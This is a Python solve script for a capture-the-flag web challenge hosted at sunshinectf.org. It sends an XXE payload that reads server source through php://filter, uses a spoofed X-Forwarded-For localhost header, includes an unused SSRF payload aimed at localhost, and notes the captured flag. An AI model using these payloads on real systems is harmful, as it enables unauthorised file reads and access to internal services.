from requests import *
from base64 import b64encode as enc

head = {
	'X-Forwarded-For': '127.0.0.1'
}

url = b'http://ng.sunshinectf.org/generate.php?input='

test = b"<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE test [<!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=generate.php'>]><input><firstName>&xxe;</firstName></input>"
payload = b"<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE payload [<!ENTITY xxe SYSTEM 'http://localhost/generate.php'>]><input><firstName>&xxe;</firstName></input>"

url += enc(test).replace(b'+', b'%2B').replace(b'=', b'%3D')

sc = get(url)
print(sc.text)

# Flag is sun{1_l0v3_hulk_7h3_3x73rn4l_3n717y_h064n}
